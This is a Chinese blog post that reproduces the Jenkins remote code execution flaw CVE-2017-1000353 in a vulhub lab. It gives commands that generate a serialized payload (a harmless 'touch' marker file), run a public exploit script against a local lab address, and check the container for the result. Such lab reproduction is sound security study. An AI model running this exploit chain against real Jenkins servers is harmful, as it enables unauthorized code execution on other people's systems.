# Jenkins-CI 远程代码执行漏洞复现（CVE-2017-1000353） - rnss - 博客园

> 原文：[https://www.cnblogs.com/rnss/p/13377826.html](https://www.cnblogs.com/rnss/p/13377826.html)

# 0x01 环境

使用vulhub搭建漏洞环境

/vulhub-master/jenkins/CVE-2017-1000353

[http://192.168.255.130:8080/](http://192.168.255.130:8080/)

![](../Images/2acc3c169f3eb64730decc882cf09fbf.png)

# 0x02 复现

首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。

https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar

执行下面命令，生成字节码文件：

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/CVE-2017-1000353_is_success"
```

执行上述代码后，在当前目录下生成jenkins_poc.ser文件，这就是序列化字符串。

![](../Images/3c9e9be50e63d60d34b05f331de02337.png)

 接着下载[exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py)，https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py

【注意】上面链接里的exploit代码需要将Proxies里面的内容注释掉，否则会报错

![](../Images/e135509943d2b34ab2cb5f579a8f5692.png)

 执行exp

```
python exploit.py http://192.168.255.130:8080 jenkins_poc.ser
```

![](../Images/5aca38e222be0ed1b590149a2537a4e1.png)

#  0x03 检验

首先查看环境的CONTAINER ID

```
sudo docker ps
```

![](../Images/5aa6b38731e87b49cd1d698441a4305c.png)

 接着进入容器内部

```
sudo docker exec -it 容器id bash
```

![](../Images/ac322a3a31bcc34a768882c823e117c4.png)

 查看/tmp目录

![](../Images/63dcb7185c5b1f734f582e94b67f7059.png)

 验证成功

参考文章：[https://blog.csdn.net/JiangBuLiu/article/details/95475293](https://blog.csdn.net/JiangBuLiu/article/details/95475293)